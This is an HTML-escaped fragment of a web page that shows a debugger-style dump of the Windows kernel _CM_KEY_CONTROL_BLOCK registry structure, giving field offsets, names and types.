 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;RefCount&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ExtFlags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Freed&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;16,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Discarded&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;17,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;HiveUnloaded&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;18,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Decommissioned&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;19,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SpareExtFlag&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;20,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;TotalLevels&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;21,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyHash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_HASH&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ConvKey&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_PATH_HASH&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x018&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;NextHash&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_HASH&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x020&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyHive&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_HHIVE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x028&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KeyCell&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x030&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;KcbPushlock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_EX_PUSH_LOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x038&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Owner&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_KTHREAD&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x038&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;SharedCount&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Int4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x040&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;DelayedDeref&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x040&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;DelayedClose&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x040&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Parking&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;2,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x041&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LayerSemantics&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x042&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;LayerHeight&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Int2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x044&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Spare1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x048&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;ParentKcb&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_KEY_CONTROL_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;+0x050&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;NameBlock&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c1&quot;&gt;_CM_NAME_CONTROL_BLOCK&lt;/span&gt;&lt;/p&gt;
